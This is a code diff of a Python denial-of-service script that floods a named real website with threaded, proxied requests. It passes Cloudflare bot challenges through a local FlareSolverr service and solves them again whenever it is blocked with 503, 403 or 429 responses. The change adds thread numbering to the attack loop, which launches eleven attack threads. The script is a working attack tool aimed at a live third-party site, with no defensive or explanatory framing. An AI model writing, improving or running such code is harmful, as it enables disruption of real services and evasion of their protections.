@@ -82,7 +82,7 @@ def solveChanellnge(url):
 			print('error in solving, trying again', err)
 
 
-def attackUrlCF(baseUrl):	
+def attackUrlCF(baseUrl, threadNumber):	
 	cookiesStr, userAgent, proxies = solveChanellnge(baseUrl)
 
 	while True:
@@ -104,7 +104,7 @@ def attackUrlCF(baseUrl):
 				requestsArr.append(grequests.get(url, headers=headers, proxies=proxies))
 			#res = requests.post(url, headers=headers, proxies=proxies, data=postData.replace('REPLACE', str(random.randint(0,99999))))
 			res = grequests.map(requestsArr, exception_handler=my_handler)
-			print(res)
+			print('threadNum: ' + threadNumber, res)
 			# print(res[0].content)
 			if str(res[0].status_code) in ['503', '403', '429']:
 				print('resolsing chalennge')
@@ -124,7 +124,7 @@ def attackAll():
 flareSolverUrl = 'http://localhost:8191/v1'
 
 for i in range(11):
-	Thread(target=attackUrlCF, args=['https://www.business2community.com']).start()
+	Thread(target=attackUrlCF, args=['https://www.business2community.com', i]).start()
 	time.sleep(30)
 input()
 
